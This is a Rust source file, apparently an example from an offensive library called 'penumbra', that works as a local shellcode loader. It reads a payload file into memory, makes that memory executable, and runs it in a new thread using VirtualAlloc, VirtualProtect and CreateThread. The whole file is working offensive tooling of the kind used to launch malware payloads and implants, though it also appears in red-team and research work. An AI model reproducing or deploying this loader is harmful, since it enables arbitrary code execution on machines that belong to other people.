use penumbra::core;

fn main() {
    let path = match std::env::args().nth(1) {
        Some(p) => p,
        None => {
            eprintln!("usage: shellcode_injection.exe <path>");
            std::process::exit(1);
        }
    };
    let path = path.as_str();

    let pid = core::utils::get_current_pid();
    println!("pid: {}", pid);

    let size = match core::files::file_size_usize(path) {
        Ok(size) => size,
        Err(e) => {
            println!("[!] file_size failed with error: {}", e);
            return;
        }
    };

    let shellcode_address = match core::utils::virtual_alloc_rw(size) {
        Ok(addr) => addr,
        Err(e) => {
            println!("[!] VirtualAlloc failed with error: {}", e);
            return;
        }
    };

    println!("shellcode_address: {:#?}", shellcode_address);

    let written = match core::files::read_into_ptr(shellcode_address, size, path) {
        Ok(written) => written,
        Err(e) => {
            println!("[!] read_into_ptr failed with error: {}", e);
            return;
        }
    };

    println!("read {} bytes from shellcode", written);

    let old_protection = match core::utils::virtual_protect_erw(shellcode_address, size) {
        Ok(old_protection) => old_protection,
        Err(e) => {
            println!("[!] VirtualProtect failed with error: {}", e);
            return;
        }
    };

    println!("old_protection: {}", old_protection);

    let thread_handle = match core::utils::create_thread(shellcode_address) {
        Ok(thread_handle) => thread_handle,
        Err(e) => {
            println!("[!] CreateThread failed with error: {}", e);
            return;
        }
    };

    println!("thread_handle: {:#?}", thread_handle);

    match core::utils::wait_for_single_object(thread_handle, 0xFFFFFFFF) {
        Ok(_) => {}
        Err(e) => {
            println!("[!] WaitForSingleObject failed with error: {}", e);
            return;
        }
    };

    match core::utils::close_handle(thread_handle) {
        Ok(_) => {}
        Err(e) => {
            println!("[!] CloseHandle failed with error: {}", e);
            return;
        }
    };
}
